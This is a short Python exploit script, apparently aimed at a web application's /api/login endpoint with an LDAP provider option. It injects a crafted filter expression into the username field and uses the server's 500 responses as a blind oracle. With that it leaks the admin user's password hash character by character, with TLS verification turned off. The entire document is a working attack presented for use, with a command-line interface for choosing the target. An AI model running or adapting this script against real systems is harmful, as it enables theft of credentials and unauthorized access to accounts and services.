import string
 
import requests
import urllib3
import argparse
 
urllib3.disable_warnings()
 
 
def leak_hash(target: str, target_user: str = "admin"):
    URL = f"{target}/api/login"
 
    charset = string.digits + string.ascii_letters + '/.$'
 
    current_guess = ''
 
    while True:
        guessed = False
        for guess in charset:
            full_guess = current_guess + guess
            stuff = requests.post(URL, json={
                "username": f"fakeuser' or 'username' eq '{target_user}' and startswith('password','{full_guess}') or 'username' eq '1",
                "password": "password",
                "provider_type": "LDAP",
                "provider_name": "LDAP"
            }, verify=False).json()
            if stuff["status"] == 500:
                guessed = True
                current_guess += guess
                print("[+]", current_guess)
                break
        if not guessed:
            break
 
 
if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Leak the admin password hash')
    parser.add_argument('target', type=str, help='The target URL')
    parser.add_argument('target_user', type=str, help='The target user', default='admin', nargs='?')
    args = parser.parse_args()
    leak_hash(args.target, args.target_user)
